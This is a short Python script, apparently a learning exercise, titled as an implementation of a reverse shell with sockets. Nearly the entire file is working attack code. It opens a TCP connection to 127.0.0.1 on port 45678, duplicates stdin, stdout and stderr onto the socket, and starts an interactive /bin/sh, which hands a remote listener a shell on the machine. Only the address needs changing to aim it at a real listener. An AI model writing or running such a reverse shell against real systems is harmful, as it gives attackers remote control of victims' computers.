#!/bin/python3
# Implementing A Reverse Shell With Sockets (netcat)

import socket as sck
import subprocess
import os


if __name__ == "__main__":
    with sck.socket(sck.AF_INET, sck.SOCK_STREAM) as sc:
        sc.connect(("127.0.0.1", 45678))
        sc.send(b"[*] Connection Established")

        # Duplicate the stdin, stdout and stderr for the next subprocess call
        for dup in range(3):
            os.dup2(sc.fileno(), dup)

        # Invoke the shell on the remote computer and list the files
        shell_remote = subprocess.call(["/bin/sh", "-i"])
        proc = subprocess.call(["/bin/ls", "-i"])
